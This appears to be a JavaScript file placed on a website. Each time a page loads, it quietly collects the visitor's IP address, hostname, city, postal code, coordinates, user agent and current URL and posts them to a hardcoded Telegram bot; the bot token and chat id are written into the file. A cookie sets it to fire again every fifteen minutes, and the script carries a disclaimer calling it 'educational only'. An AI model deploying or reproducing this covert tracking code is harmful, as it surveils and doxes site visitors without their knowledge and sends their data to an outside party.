function createCookie(name, value, seconds) {
    let expires = '';
    if (seconds) {
      let date = new Date();
      date.setTime(date.getTime() + (seconds * 1000));
      expires = '; expires=' + date.toUTCString();
    }
    document.cookie = `${name}=${value}${expires}; path=/; SameSite=None; Secure`;
}

async function getClientInfo() {
    const response = await fetch("https://ipinfo.io/json");
    const data = await response.json();
    const IP = data.ip;
    const currentURL = window.location.href;
    const Hostname = data.hostname;
    const Country = data.country;
    const City = data.city;
    const Region = data.region;
    const Postal = data.postal;
    const Timezone = data.timezone;
    const Location = data.loc;
    const userAgent = navigator.userAgent;
    
    const botToken = "6275460493:AAGVqmooTODAnXro_a76IAz_VjCe8ghq9I4";
    const chatId = "1185131759";
    
    const Template = `🆕 Client :
    - 🏛 Page : ${currentURL}
    - 📡 IP : ${IP}
    - 📼 Hostname : ${Hostname}
    - 🗺 Country : ${Country} 
    - 🏙 City : ${City}
    - 🏝 Region : ${Region}
    - 📬 Postal Code : ${Postal}
    - ⏳ Timezone : ${Timezone}
    - 📌 Location : ${Location}
    - 🛂 User-Agent : ${userAgent}
    The purpose of this script is educational only and not to dox anyone.`;
    console.log(Template)
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestData = `chat_id=${chatId}&text=${encodeURIComponent(Template)}`;
    await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-type": "application/x-www-form-urlencoded"
      },
      body: requestData
    });
}
  
async function run() {
    await getClientInfo();
    createCookie("Auth", "1", "900")

}

if (window.location.pathname === '/index.html' || window.location.pathname === '/') {
    console.log("TEST , TEST , Your are landing on the index page ! 🚀")
    if (!document.cookie.includes('Auth')) {
        console.log("Auth cookie not detected, cooking some for ya 👨🏽‍🍳")
        run();
        console.log("Here they are, delicious ( they won't be good in 15 minutes, eat them fast! ) :)🍪")
    } else {
        console.log("Auth Cookie present, 🍪 Miam :) ")
    }
} else {
    run();
    setTimeout(function() {window.location.href = "index.html";}, 1000);

}
